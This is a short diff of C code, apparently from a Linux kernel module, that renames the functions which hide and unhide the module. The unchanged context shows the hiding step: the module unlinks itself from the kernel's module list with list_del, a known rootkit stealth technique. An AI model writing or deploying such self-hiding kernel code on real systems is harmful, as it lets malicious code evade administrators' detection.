@@ -6,7 +6,7 @@
 
 static struct list_head *this_module_prev;
 
-void hide_set_module_this(void)
+void hide_enable_thismodule(void)
 {
     // only set if previously unset
     if (this_module_prev)
@@ -16,7 +16,7 @@ void hide_set_module_this(void)
     list_del(&THIS_MODULE->list);
 }
 
-void hide_unset_module_this(void)
+void hide_disable_thismodule(void)
 {
     // only unset if previously set
     if (!this_module_prev)
